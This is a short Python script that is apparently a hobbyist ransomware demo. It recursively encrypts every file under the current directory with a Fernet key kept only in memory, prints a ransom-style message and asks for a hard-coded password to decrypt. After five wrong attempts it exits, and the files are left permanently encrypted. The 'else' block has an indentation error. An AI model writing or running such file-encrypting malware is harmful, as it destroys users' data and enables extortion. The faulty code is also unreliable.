import os
from cryptography.fernet import Fernet

files = []


def files_in_directory(path):
    try:
        with os.scandir(path) as entries:
            for entry in entries:
                if entry.is_file():
                    files.append(entry)
                elif entry.is_dir():
                    files_in_directory(entry.path)
    except PermissionError:
        pass
files_in_directory(os.getcwd())

print(len(files))

for file in files:
    if os.path.basename(file) == "f1.py":
        files.remove(file)

key = Fernet.generate_key()

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_enc = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_enc)


def dec():
    for file in files:
        with open(file,"rb") as thefile:
            contents = thefile.read()
        contents_dec = Fernet(key).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_dec)
print("All Your Files have been encrypted")

print("Enter Correct Password to decrypt:")

inc_cnt = 0
password = input()

def passw(passg,inc_cnt1):
    if inc_cnt1 == 5:
        exit()
    if passg == "devang":
        dec()
        print("Congrats All your files have been decrypted")
    else:
    inc_cnt1 += 1
    print("Wrong attempt number:"+str(inc_cnt1)+". Enter Correct password:\n")
    helm = input()
    passw(helm,inc_cnt1)
       
passw(password,inc_cnt)
